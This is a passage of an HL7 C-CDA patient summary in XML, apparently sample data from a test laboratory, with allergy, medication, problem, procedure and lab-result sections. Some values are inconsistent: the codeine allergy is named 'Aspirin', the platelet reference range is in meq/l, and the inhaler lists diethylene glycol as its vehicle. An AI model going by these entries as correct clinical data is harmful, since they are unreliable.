	<authenticator>
		<time value="20050329224411+0500"/>
		<signatureCode code="S"/>
		<assignedEntity>
			<id extension="KP00017" root="2.16.840.1.113883.19"/>
			<addr>
				<streetAddressLine>21 North Ave.</streetAddressLine>
				<city>Burlington</city>
				<state>MA</state>
				<postalCode>02368</postalCode>
				<country>USA</country>
			</addr>
			<telecom use="WP" value="tel:(555)555-1003"/>
			<assignedPerson>
				<name>
					<given>Henry</given>
					<family>Seven</family>
				</name>
			</assignedPerson>
		</assignedEntity>
	</authenticator>
	<documentationOf typeCode="DOC">
		<serviceEvent classCode="PCPR">
			<effectiveTime>
				<low value="20100601"/>
				<high value="20100915"/>
			</effectiveTime>
			<performer typeCode="PRF">
				<functionCode code="PP" displayName="Primary Care Provider" codeSystem="2.16.840.1.113883.12.443" codeSystemName="Provider Role">
					<originalText>Primary Care Provider</originalText>
				</functionCode>
				<time>
					<low value="20020716"/>
					<high value="20070915"/>
				</time>
				<assignedEntity>
					<id extension="PseudoMD-1" root="2.16.840.1.113883.19"/>
					<code code="200000000X" displayName="Allopathic and Osteopathic Physicians" codeSystemName="Provider Codes" codeSystem="2.16.840.1.113883.6.101"/>
					<addr/>
					<telecom value="tel:+1-301-975-3251" use="HP"/>
					<assignedPerson>
						<name>
							<prefix>Dr.</prefix>
							<given>Pseudo</given>
							<family>Physician-1</family>
						</name>
					</assignedPerson>
					<representedOrganization>
						<id root="2.16.840.1.113883.3.72.5"/>
						<name>NIST HL7 Test Laboratory</name>
						<telecom/>
						<addr/>
					</representedOrganization>
				</assignedEntity>
			</performer>
			<performer typeCode="PPRF">
				<functionCode code="PP" displayName="Primary Care Provider" codeSystem="2.16.840.1.113883.12.443" codeSystemName="Provider Role">
					<originalText>Primary Care Provider</originalText>
				</functionCode>
				<time>
					<low value="20020716"/>
					<high value="20070915"/>
				</time>
				<assignedEntity>
					<id extension="PseudoMD-3" root="2.16.840.1.113883.19"/>
					<code code="207RG0100X" displayName="Gastroenterologist" codeSystemName="Provider Codes" codeSystem="2.16.840.1.113883.6.101"/>
					<addr/>
					<telecom value="tel:+1-301-975-3251" use="HP"/>
					<assignedPerson>
						<name>
							<prefix>Dr.</prefix>
							<given>Pseudo</given>
							<family>Physician-3</family>
						</name>
					</assignedPerson>
					<representedOrganization>
						<id root="2.16.840.1.113883.19.123"/>
						<name>HL7 Test Laboratory</name>
						<telecom/>
						<addr/>
					</representedOrganization>
				</assignedEntity>
			</performer>
		</serviceEvent>
	</documentationOf>
	<!-- ********************************************************

     CDA Body

     ******************************************************** -->
	<component>
		<structuredBody>
			<!-- *********************** -->
			<!--

********************************************************

Allergies, Adverse Reactions, Alerts

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.6.1"/>
					<!-- Alerts section template -->
					<code code="48765-2" codeSystem="2.16.840.1.113883.6.1"/>
					<title>Allergies, Adverse Reactions, Alerts</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Substance</th>
									<th>Reaction</th>
									<th>Status</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>Penicillin</td>
									<td>
										<content ID="reaction1">Hives</content>
									</td>
									<td>Active</td>
								</tr>
								<tr>
									<td>Aspirin</td>
									<td>
										<content ID="reaction2">Wheezing</content>
									</td>
									<td>Active</td>
								</tr>
								<tr>
									<td>Codeine</td>
									<td>
										<content ID="reaction3">Nausea</content>
									</td>
									<td>Active</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.30"/>
							<!-- ** Allergy problem act ** -->
							<id root="36e3e930-7b14-11db-9fe1-0800200c9a66"/>
							<code code="48765-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Allergies, adverse reactions, alerts"/>
							<statusCode code="active"/>
							<effectiveTime value="20090909">
								<low value="20090902"/>
								<high value="20100103"/>
							</effectiveTime>
							<entryRelationship typeCode="SUBJ">
								<observation classCode="OBS" moodCode="EVN">
									<!-- allergy observation template -->
									<templateId root="2.16.840.1.113883.10.20.22.4.7"/>
									<id root="4adc1020-7b14-11db-9fe1-0800200c9a66"/>
									<code code="416098002" displayName="drug allergy" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<low value="20110215"/>
									</effectiveTime>
									<value xsi:type="CD" code="282100009" displayName="Adverse reaction to substance" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT">
										<originalText>
											<reference value="#reaction1"/>
										</originalText>
									</value>
									<participant typeCode="CSM">
										<participantRole classCode="MANU">
											<playingEntity classCode="MMAT">
												<code code="314422" displayName="ALLERGENIC EXTRACT, PENICILLIN" codeSystem="2.16.840.1.113883.6.88" codeSystemName="RxNorm">
													<originalText>
														<reference value="#reaction1"/>
													</originalText>
												</code>
												<name>Penicillin</name>
											</playingEntity>
										</participantRole>
									</participant>
									<entryRelationship typeCode="SUBJ">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.28"/>
											<!-- Alert status observation template -->
											<code code="33999-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Status"/>
											<statusCode code="completed"/>
											<value xsi:type="CE" code="55561003" codeSystem="2.16.840.1.113883.6.96" displayName="Active"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="MFST">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.9"/>
											<!-- Reaction observation template -->
											<id root="4adc1020-7b14-11db-9fe1-0800200c9a64"/>
											<code nullFlavor="NA"/>
											<text>
												<reference value="#reaction1"/>
											</text>
											<statusCode code="completed"/>
											<effectiveTime>
												<low value="20090711"/>
											</effectiveTime>
											<value xsi:type="CD" code="247472004" codeSystem="2.16.840.1.113883.6.96" displayName="Hives"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="SUBJ">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.8"/>
											<!-- ** Severity observation template ** -->
											<code code="SEV" displayName="Severity Observation" codeSystem="2.16.840.1.113883.5.4" codeSystemName="ActCode"/>
											<text>
												<reference value="#severity1"/>
											</text>
											<statusCode code="completed"/>
											<value xsi:type="CD" code="371924009" displayName="Moderate to severe" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
										</observation>
									</entryRelationship>
								</observation>
							</entryRelationship>
						</act>
					</entry>
					<entry typeCode="DRIV">
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.30"/>
							<!-- ** Allergy problem act ** -->
							<id root="36e3e930-7b14-11db-9fe1-0800200c9a66"/>
							<code code="48765-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Allergies, adverse reactions, alerts"/>
							<statusCode code="active"/>
							<effectiveTime value="20090909">
								<low value="20090902"/>
								<high value="20100103"/>
							</effectiveTime>
							<entryRelationship typeCode="SUBJ">
								<observation classCode="OBS" moodCode="EVN">
									<!-- allergy observation template -->
									<templateId root="2.16.840.1.113883.10.20.22.4.7"/>
									<id root="4adc1020-7b14-11db-9fe1-0800200c9a66"/>
									<code code="416098002" displayName="drug allergy" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<low value="20110215"/>
									</effectiveTime>
									<value xsi:type="CD" code="282100009" displayName="Adverse reaction to substance" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT">
										<originalText>
											<reference value="#reaction2"/>
										</originalText>
									</value>
									<participant typeCode="CSM">
										<participantRole classCode="MANU">
											<playingEntity classCode="MMAT">
												<code code="R16CO5Y76E" displayName="ASPIRIN" codeSystem="2.16.840.1.113883.4.9" codeSystemName="UNII">
													<originalText>
														<reference value="#reaction2"/>
													</originalText>
												</code>
												<name>Aspirin</name>
											</playingEntity>
										</participantRole>
									</participant>
									<entryRelationship typeCode="SUBJ">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.28"/>
											<!-- Alert status observation template -->
											<code code="33999-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Status"/>
											<statusCode code="completed"/>
											<value xsi:type="CE" code="55561003" codeSystem="2.16.840.1.113883.6.96" displayName="Active"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="MFST">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.9"/>
											<!-- Reaction observation template -->
											<id root="4adc1020-7b14-11db-9fe1-0800200c9a64"/>
											<code nullFlavor="NA"/>
											<text>
												<reference value="#reaction2"/>
											</text>
											<statusCode code="completed"/>
											<effectiveTime>
												<low value="20090711"/>
											</effectiveTime>
											<value xsi:type="CD" code="56018004" codeSystem="2.16.840.1.113883.6.96" displayName="Wheezing"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="SUBJ">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.8"/>
											<!-- ** Severity observation template ** -->
											<code code="SEV" displayName="Severity Observation" codeSystem="2.16.840.1.113883.5.4" codeSystemName="ActCode"/>
											<text>
												<reference value="#severity2"/>
											</text>
											<statusCode code="completed"/>
											<value xsi:type="CD" code="371924009" displayName="Moderate to severe" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
										</observation>
									</entryRelationship>
								</observation>
							</entryRelationship>
						</act>
					</entry>
					<entry typeCode="DRIV">
						<act classCode="ACT" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.30"/>
							<!-- ** Allergy problem act ** -->
							<id root="36e3e930-7b14-11db-9fe1-0800200c9a66"/>
							<code code="48765-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Allergies, adverse reactions, alerts"/>
							<statusCode code="active"/>
							<effectiveTime value="20090909">
								<low value="20090902"/>
								<high value="20100103"/>
							</effectiveTime>
							<entryRelationship typeCode="SUBJ">
								<observation classCode="OBS" moodCode="EVN">
									<!-- allergy observation template -->
									<templateId root="2.16.840.1.113883.10.20.22.4.7"/>
									<id root="4adc1020-7b14-11db-9fe1-0800200c9a66"/>
									<code code="416098002" displayName="drug allergy" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<low value="20110215"/>
									</effectiveTime>
									<value xsi:type="CD" code="282100009" displayName="Adverse reaction to substance" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT">
										<originalText>
											<reference value="#reaction2"/>
										</originalText>
									</value>
									<participant typeCode="CSM">
										<participantRole classCode="MANU">
											<playingEntity classCode="MMAT">
												<code code="Q830PW7520" displayName="Codeine" codeSystem="2.16.840.1.113883.4.9" codeSystemName="UNII">
													<originalText>
														<reference value="#reaction3"/>
													</originalText>
												</code>
												<name>Aspirin</name>
											</playingEntity>
										</participantRole>
									</participant>
									<entryRelationship typeCode="SUBJ">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.28"/>
											<!-- Alert status observation template -->
											<code code="33999-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Status"/>
											<statusCode code="completed"/>
											<value xsi:type="CE" code="55561003" codeSystem="2.16.840.1.113883.6.96" displayName="Active"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="MFST">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.9"/>
											<!-- Reaction observation template -->
											<id root="4adc1020-7b14-11db-9fe1-0800200c9a64"/>
											<code nullFlavor="NA"/>
											<text>
												<reference value="#reaction3"/>
											</text>
											<statusCode code="completed"/>
											<effectiveTime>
												<low value="20090711"/>
											</effectiveTime>
											<value xsi:type="CD" code="73879007" codeSystem="2.16.840.1.113883.6.96" displayName="Nausea"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="SUBJ">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.8"/>
											<!-- ** Severity observation template ** -->
											<code code="SEV" displayName="Severity Observation" codeSystem="2.16.840.1.113883.5.4" codeSystemName="ActCode"/>
											<text>
												<reference value="#severity3"/>
											</text>
											<statusCode code="completed"/>
											<value xsi:type="CD" code="371924009" displayName="Moderate to severe" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
										</observation>
									</entryRelationship>
								</observation>
							</entryRelationship>
						</act>
					</entry>
				</section>
			</component>
			<!--

********************************************************

MEDICATIONS

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.1.1"/>
					<code code="10160-0" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="HISTORY OF MEDICATION USE"/>
					<title>Medications</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Medication</th>
									<th>Directions</th>
									<th>Start Date</th>
									<th>Status</th>
									<th>Indications</th>
									<th>Fill Instructions</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>
										<content ID="Med1">Proventil 0.09 MG/ACTUAT inhalant solution</content>
									</td>
									<td>2 puffs QID PRN wheezing</td>
									<td>2011-03-01</td>
									<td>Active</td>
									<td>Bronchitis (32398004 SNOMED CT)</td>
									<td>Generic Substitition Allowed</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<substanceAdministration classCode="SBADM" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.16"/>
							<!-- ** MEDICATION ACTIVITY -->
							<id root="cdbd33f0-6cde-11db-9fe1-0800200c9a66"/>
							<text>
								<reference value="#Med1"/> 0.09 MG/ACTUAT inhalant solution, 2 puffs QID PRN wheezing

							</text>
							<statusCode code="completed"/>
							<effectiveTime xsi:type="IVL_TS">
								<low value="20110301"/>
								<high value="20120301"/>
							</effectiveTime>
							<effectiveTime xsi:type="PIVL_TS" institutionSpecified="true" operator="A">
								<period value="6" unit="h"/>
							</effectiveTime>
							<routeCode code="C38216" codeSystem="2.16.840.1.113883.3.26.1.1" codeSystemName="NCI Thesaurus" displayName="RESPIRATORY (INHALATION)"/>
							<doseQuantity value="1"/>
							<rateQuantity value="90" unit="ml/min"/>
							<maxDoseQuantity nullFlavor="UNK">
								<numerator nullFlavor="UNK"/>
								<denominator nullFlavor="UNK"/>
							</maxDoseQuantity>
							<administrationUnitCode code="C42944" displayName="INHALANT" codeSystem="2.16.840.1.113883.3.26.1.1" codeSystemName="NCI Thesaurus"/>
							<consumable>
								<manufacturedProduct>
									<templateId root="2.16.840.1.113883.10.20.22.4.23"/>
									<id/>
									<manufacturedMaterial>
										<code code="329498" codeSystem="2.16.840.1.113883.6.88" displayName="Albuterol 0.09 MG/ACTUAT inhalant solution">
											<translation code="573621" displayName="Proventil 0.09 MG/ACTUAT inhalant solution" codeSystem="2.16.840.1.113883.6.88" codeSystemName="RxNorm"/>
										</code>
									</manufacturedMaterial>
									<manufacturerOrganization/>
								</manufacturedProduct>
							</consumable>
							<performer>
								<assignedEntity>
									<id nullFlavor="NI"/>
									<addr nullFlavor="UNK"/>
									<telecom nullFlavor="UNK"/>
									<representedOrganization>
										<id root="2.16.840.1.113883.19.5"/>
										<name>Good Health Clinic</name>
										<telecom nullFlavor="UNK"/>
										<addr nullFlavor="UNK"/>
									</representedOrganization>
								</assignedEntity>
							</performer>
							<participant typeCode="CSM">
								<participantRole classCode="MANU">
									<templateId root="2.16.840.1.113883.10.20.22.4.24"/>
									<code code="412307009" displayName="drug vehicle" codeSystem="2.16.840.1.113883.6.96"/>
									<playingEntity classCode="MMAT">
										<code code="5955009" displayName="Diethylene Glycol" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
										<name>Diethylene Glycol</name>
									</playingEntity>
								</participantRole>
							</participant>
							<entryRelationship typeCode="RSON">
								<observation classCode="COND" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.19"/>
									<id root="db734647-fc99-424c-a864-7e3cda82e703" extension="45665"/>
									<code code="404684003" displayName="Finding" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT"/>
									<statusCode code="completed"/>
									<value xsi:type="CE" code="32398004" displayName="Bronchitis" codeSystem="2.16.840.1.113883.6.96"/>
								</observation>
							</entryRelationship>
							<entryRelationship typeCode="REFR">
								<supply classCode="SPLY" moodCode="INT">
									<templateId root="2.16.840.1.113883.10.20.22.4.17"/>
									<id nullFlavor="NI"/>
									<statusCode code="completed"/>
									<effectiveTime xsi:type="IVL_TS">
										<low value="20020101"/>
										<high nullFlavor="UNK"/>
									</effectiveTime>
									<repeatNumber value="1"/>
									<quantity value="75"/>
									<author>
										<time nullFlavor="UNK"/>
										<assignedAuthor>
											<id/>
											<addr nullFlavor="UNK"/>
											<telecom nullFlavor="UNK"/>
											<assignedPerson>
												<name>
													<prefix>Dr.</prefix>
													<given>Robert</given>
													<family>Michaels</family>
												</name>
											</assignedPerson>
										</assignedAuthor>
									</author>
									<entryRelationship typeCode="SUBJ" inversionInd="true">
										<act classCode="ACT" moodCode="INT">
											<templateId root="2.16.840.1.113883.10.20.22.4.20"/>
											<!-- ** Instructions Template ** -->
											<code code="409073007" codeSystem="2.16.840.1.113883.6.96" displayName="instruction"/>
											<text>label in spanish</text>
											<statusCode code="completed"/>
										</act>
									</entryRelationship>
								</supply>
							</entryRelationship>
							<entryRelationship typeCode="REFR">
								<supply classCode="SPLY" moodCode="EVN">
									<templateId root="2.16.840.1.113883.10.20.22.4.18"/>
									<!-- ** Medication Dispense Template ** -->
									<id root="1.2.3.4.56789.1" extension="cb734647-fc99-424c-a864-7e3cda82e704"/>
									<statusCode code="completed"/>
									<effectiveTime value="20020101"/>
									<repeatNumber value="1"/>
									<quantity value="75"/>
									<performer>
										<time nullFlavor="UNK"/>
										<assignedEntity>
											<id/>
											<addr>
												<streetAddressLine>17 Daws Rd.</streetAddressLine>
												<city>Blue Bell</city>
												<state>MA</state>
												<postalCode>02368</postalCode>
												<country>US</country>
											</addr>
											<telecom nullFlavor="UNK"/>
											<assignedPerson>
												<name>
													<prefix>Dr.</prefix>
													<given>Robert</given>
													<family>Michaels</family>
												</name>
											</assignedPerson>
											<representedOrganization>
												<id root="2.16.840.1.113883.19.5"/>
												<name>Good Health Clinic</name>
												<telecom nullFlavor="UNK"/>
												<addr nullFlavor="UNK"/>
											</representedOrganization>
										</assignedEntity>
									</performer>
								</supply>
							</entryRelationship>
							<precondition typeCode="PRCN">
								<templateId root="2.16.840.1.113883.10.20.22.4.25"/>
								<criterion>
									<code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
									<value xsi:type="CE" code="56018004" codeSystem="2.16.840.1.113883.6.96" displayName="Wheezing"/>
								</criterion>
							</precondition>
						</substanceAdministration>
					</entry>
				</section>
			</component>
			<!--

********************************************************

PROBLEM LIST

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.5"/>
					<code code="11450-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="PROBLEM LIST"/>
					<title>Problems</title>
					<text>
						<list listType="ordered">
							<item>Pneumonia: Resolved in March 1998</item>
							<item>...</item>
						</list>
					</text>
					<entry typeCode="DRIV">
						<act classCode="ACT" moodCode="EVN">
							<!-- Problem act template -->
							<templateId root="2.16.840.1.113883.10.20.22.4.3"/>
							<id root="ec8a6ff8-ed4b-4f7e-82c3-e98e58b45de7"/>
							<code nullFlavor="NA"/>
							<statusCode code="completed"/>
							<effectiveTime>
								<low value="199803"/>
								<high value="20110103"/>
							</effectiveTime>
							<entryRelationship typeCode="SUBJ">
								<observation classCode="OBS" moodCode="EVN">
									<!-- Problem observation template -->
									<templateId root="2.16.840.1.113883.10.20.22.4.4"/>
									<id root="ab1791b0-5c71-11db-b0de-0800200c9a66"/>
									<code code="409586006" codeSystem="2.16.840.1.113883.6.96" displayName="Complaint"/>
									<statusCode code="completed"/>
									<effectiveTime>
										<low value="199803"/>
									</effectiveTime>
									<value xsi:type="CD" code="233604007" codeSystem="2.16.840.1.113883.6.96" displayName="Pneumonia"/>
									<entryRelationship typeCode="REFR">
										<observation classCode="OBS" moodCode="EVN">
											<!-- Problem status observation template -->
											<templateId root="2.16.840.1.113883.10.20.22.4.6"/>
											<code code="33999-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Status"/>
											<statusCode code="completed"/>
											<value xsi:type="CD" code="55561003" codeSystem="2.16.840.1.113883.6.96" displayName="Active" codeSystemName="SNOMED CT"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="SUBJ" inversionInd="true">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.31"/>
											<!--    Age observation template   -->
											<code code="397659008" codeSystem="2.16.840.1.113883.6.96" displayName="Age"/>
											<statusCode code="completed"/>
											<value xsi:type="PQ" value="57" unit="a"/>
										</observation>
									</entryRelationship>
									<entryRelationship typeCode="REFR">
										<observation classCode="OBS" moodCode="EVN">
											<templateId root="2.16.840.1.113883.10.20.22.4.5"/>
											<!-- Health status observation template -->
											<code code="11323-3" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="Health status"/>
											<statusCode code="completed"/>
											<value xsi:type="CE" code="413322009" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Resolved"/>
										</observation>
									</entryRelationship>
								</observation>
							</entryRelationship>
						</act>
					</entry>
				</section>
			</component>
			<!--

********************************************************

PROCEDURES

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.7"/>
					<!-- Procedures section template -->
					<code code="47519-4" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="PROCEDURES"/>
					<title>Procedures</title>
					<text>
						<table border="1" width="100%">
							<thead>
								<tr>
									<th>Procedure</th>
									<th>Date</th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td>
										<content ID="Proc1">Colonic polypectomy</content>
									</td>
									<td>1998</td>
								</tr>
							</tbody>
						</table>
					</text>
					<entry typeCode="DRIV">
						<procedure classCode="PROC" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.14"/>
							<!-- ***** Procedure  Activity Procedure Template ***** -->
							<id root="d68b7e32-7810-4f5b-9cc2-acd54b0fd85d"/>
							<code code="274025005" codeSystem="2.16.840.1.113883.6.96" displayName="Colonic polypectomy">
								<originalText>
									<reference value="#Proc1"/>
								</originalText>
							</code>
							<statusCode code="completed"/>
							<effectiveTime value="20110215"/>
							<methodCode nullFlavor="UNK"/>
							<specimen typeCode="SPC">
								<specimenRole classCode="SPEC">
									<id root="c2ee9ee9-ae31-4628-a919-fec1cbb58683"/>
									<specimenPlayingEntity>
										<code code="309226005" codeSystem="2.16.840.1.113883.6.96" displayName="colonic polyp sample"/>
									</specimenPlayingEntity>
								</specimenRole>
							</specimen>
							<performer>
								<assignedEntity>
									<id root="c2ee9ee9-ae31-4628-a919-fec1cbb58687"/>
									<addr>
										<streetAddressLine>17 Daws Rd.</streetAddressLine>
										<city>Blue Bell</city>
										<state>MA</state>
										<postalCode>02368</postalCode>
										<country>US</country>
									</addr>
									<telecom use="WP" value="(555)555-555-1234"/>
									<representedOrganization>
										<id root="c2ee9ee9-ae31-4628-a919-fec1cbb58686"/>
										<name>Good Health Clinic</name>
										<telecom use="WP" value="(555)555-555-1234"/>
										<addr>
											<streetAddressLine>17 Daws Rd.</streetAddressLine>
											<city>Blue Bell</city>
											<state>MA</state>
											<postalCode>02368</postalCode>
											<country>US</country>
										</addr>
									</representedOrganization>
								</assignedEntity>
							</performer>
							<participant typeCode="LOC">
								<participantRole classCode="MANU">
									<templateId root="2.16.840.1.113883.10.20.22.4.37"/>
									<!--   Product instance template   -->
									<id root="eb936010-7b17-11db-9fe1-0800200c9a68"/>
									<playingDevice>
										<code code="90412006" codeSystem="2.16.840.1.113883.6.96" displayName="Colonoscope"/>
									</playingDevice>
									<scopingEntity>
										<id root="eb936010-7b17-11db-9fe1-0800200c9b65"/>
									</scopingEntity>
								</participantRole>
							</participant>
						</procedure>
					</entry>
					<entry>
						<observation classCode="OBS" moodCode="EVN">
							<templateId root="2.16.840.1.113883.10.20.22.4.13"/>
							<!-- Procedure Activity Observation -->
							<id extension="123456789" root="2.16.840.1.113883.19"/>
							<code code="274025005" codeSystem="2.16.840.1.113883.6.96" displayName="Colonic polypectomy" codeSystemName="SNOMED-CT">
								<originalText>
									<reference value="#Proc1"/>
								</originalText>
							</code>
							<statusCode code="aborted"/>
							<effectiveTime value="20110203"/>
							<priorityCode code="CR" codeSystem="2.16.840.1.113883.5.7" codeSystemName="ActPriority" displayName="Callback results"/>
							<value xsi:type="CD"/>
							<methodCode nullFlavor="UNK"/>
							<targetSiteCode code="416949008" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Abdomen and pelvis"/>
							<performer>
								<assignedEntity>
									<id root="2.16.840.1.113883.19.5" extension="1234"/>
									<addr>
										<streetAddressLine>17 Daws Rd.</streetAddressLine>
										<city>Blue Bell</city>
										<state>MA</state>
										<postalCode>02368</postalCode>
										<country>US</country>
									</addr>
									<telecom use="WP" value="(555)555-555-1234"/>
									<representedOrganization>
										<id root="2.16.840.1.113883.19.5"/>
										<name>Good Health Clinic</name>
										<telecom nullFlavor="UNK"/>
										<addr nullFlavor="UNK"/>
									</representedOrganization>
								</assignedEntity>
							</performer>
							<participant typeCode="LOC">
								<participantRole classCode="SDLOC">
									<templateId root="2.16.840.1.113883.10.20.22.4.32"/>
									<!-- Service Delivery Location template -->
									<code code="GACH" codeSystem="2.16.840.1.113883.5.111" codeSystemName="HL7 RoleCode" displayName="General Acute Care Hospital"/>
									<addr>
										<streetAddressLine>17 Daws Rd.</streetAddressLine>
										<city>Blue Bell</city>
										<state>MA</state>
										<postalCode>02368</postalCode>
										<country>US</country>
									</addr>
									<telecom nullFlavor="UNK"/>
									<playingEntity classCode="PLC">
										<name>Good Health Clinic</name>
									</playingEntity>
								</participantRole>
							</participant>
						</observation>
					</entry>
					<entry>
						<act classCode="ACT" moodCode="INT">
							<templateId root="2.16.840.1.113883.10.20.22.4.12"/>
							<id root="1.2.3.4.5.6.7.8" extension="1234567"/>
							<code code="274025005" codeSystem="2.16.840.1.113883.6.96" codeSystemName="SNOMED CT" displayName="Colonic polypectomy">
								<originalText>
									<reference value="#Proc1"/>
								</originalText>
							</code>
							<statusCode code="completed"/>
							<effectiveTime value="20110203"/>
							<priorityCode code="CR" codeSystem="2.16.840.1.113883.5.7" codeSystemName="ActPriority" displayName="Callback results"/>
							<performer>
								<assignedEntity>
									<id root="2.16.840.1.113883.19" extension="1234"/>
									<addr>
										<streetAddressLine>17 Daws Rd.</streetAddressLine>
										<city>Blue Bell</city>
										<state>MA</state>
										<postalCode>02368</postalCode>
										<country>US</country>
									</addr>
									<telecom use="WP" value="(555)555-555-1234"/>
									<representedOrganization>
										<id root="2.16.840.1.113883.19.5"/>
										<name>Good Health Clinic</name>
										<telecom nullFlavor="UNK"/>
										<addr nullFlavor="UNK"/>
									</representedOrganization>
								</assignedEntity>
							</performer>
							<participant typeCode="LOC">
								<participantRole classCode="SDLOC">
									<templateId root="2.16.840.1.113883.10.20.22.4.32"/>
									<!-- Service Delivery Location template -->
									<code code="GACH" codeSystem="2.16.840.1.113883.5.111" codeSystemName="HL7 RoleCode" displayName="General Acute Care Hospital"/>
									<addr>
										<streetAddressLine>17 Daws Rd.</streetAddressLine>
										<city>Blue Bell</city>
										<state>MA</state>
										<postalCode>02368</postalCode>
										<country>US</country>
									</addr>
									<telecom nullFlavor="UNK"/>
									<playingEntity classCode="PLC">
										<name>Good Health Clinic</name>
									</playingEntity>
								</participantRole>
							</participant>
						</act>
					</entry>
				</section>
			</component>
			<!--

********************************************************

RESULTS

********************************************************

-->
			<component>
				<section>
					<templateId root="2.16.840.1.113883.10.20.22.2.3.1"/>
					<code code="30954-2" codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" displayName="RESULTS"/>
					<title>Results</title>
					<text>
						<table>
							<tbody>
								<tr>
									<td colspan="2">LABORATORY INFORMATION</td>
								</tr>
								<tr>
									<td colspan="2">Chemistries and drug levels</td>
								</tr>
								<tr>
									<td>
										<content ID="result1">HGB (M 13-18 g/dl; F 12-16 g/dl)</content>
									</td>
									<td>13.2</td>
								</tr>
								<tr>
									<td>
										<content ID="result2">WBC (4.3-10.8 10+3/ul)</content>
									</td>
									<td>6.7</td>
								</tr>
								<tr>
									<td>
										<content ID="result3">PLT (135-145 meq/l)</content>
									</td>
									<td>123 (L)</td>
								</tr>
								<tr>
									<td colspan="2">Liver Functions and Other Laboratory Values</td>
								</tr>
								<tr>
									<td>ALT (SGPT)</td>
									<td>31.0</td>
								</tr>
								<tr>
									<td>AST (SGOT)</td>
									<td>18.0</td>
								</tr>
								<tr>
									<td>GGT</td>
									<td>28.0 Alk</td>
								</tr>
								<tr>
									<td>Phos</td>
									<td>86.0</td>
								</tr>
								<tr>
									<td>Total Bili</td>
									<td>0.1</td>
								</tr>
								<tr>
									<td>Albumin</td>
									<td>3.2</td>
								</tr>
								<tr>
									<td colspan="2">Blood Count</td>
								</tr>
								<tr>
									<td>White Count</td>
									<td>7.7</td>
								</tr>
								<tr>
									<td>Platelets</td>
									<td>187.0</td>
								</tr>
								<tr>
									<td>Hematocrit</td>
									<td>23.7</td>
								</tr>
								<tr>
									<td>Hemoglobin</td>
